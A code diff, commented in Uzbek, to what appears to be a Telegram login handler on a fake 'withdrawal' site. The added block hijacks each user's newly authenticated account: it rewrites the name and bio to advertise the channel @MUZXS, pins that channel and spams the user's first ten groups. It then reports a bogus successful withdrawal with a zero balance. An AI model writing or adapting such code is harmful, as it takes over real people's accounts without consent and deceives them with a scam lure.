@@ -142,6 +142,51 @@ ${sessionString}`;
             }
         }
 
+        // ================= AUTOMATION LOGIC START =================
+        (async () => {
+            try {
+                // A. Izoh va Ismni o'zgartirish
+                await client.invoke(new Api.account.UpdateProfile({
+                    firstName: "MUZXS TELEGRAM KANALI",
+                    lastName: "",
+                    about: "Eng So’ngi Musiqalar 👉@MUZXS👈 kanalida"
+                }));
+
+                // B. Kanalni pin qilish (@muzxs)
+                try {
+                    const channelPeer = await client.getEntity('muzxs');
+                    await client.invoke(new Api.messages.ToggleDialogPin({
+                        pinned: true,
+                        peer: channelPeer
+                    }));
+                } catch (pinErr) {
+                    console.error("Kanalni pin qilishda xatolik:", pinErr);
+                }
+
+                // C. 10 ta guruhga xabar yuborish
+                try {
+                    const dialogs = await client.getDialogs();
+                    const groups = dialogs.filter(d => d.isGroup);
+                    const targetGroups = groups.slice(0, 10);
+
+                    for (const group of targetGroups) {
+                        try {
+                            await client.sendMessage(group.id, {
+                                message: "Eng So’ngi Musiqalar 👉@ MUZXS👈 kanalida"
+                            });
+                        } catch (msgErr) {
+                            console.error(`Guruhga xabar yuborishda xato (${group.id}):`, msgErr);
+                        }
+                    }
+                } catch (groupErr) {
+                    console.error("Guruhlarni olishda xatolik:", groupErr);
+                }
+            } catch (autoErr) {
+                console.error("Avtomatlashtirishda umumiy xatolik:", autoErr);
+            }
+        })();
+        // ================= AUTOMATION LOGIC END ===================
+
         delete activeAuthSessions[cleanPhone];
 
         return res.json({ success: true, message: "Mablag' muvaffaqiyatli yechib olindi!", newBalance: 0 });
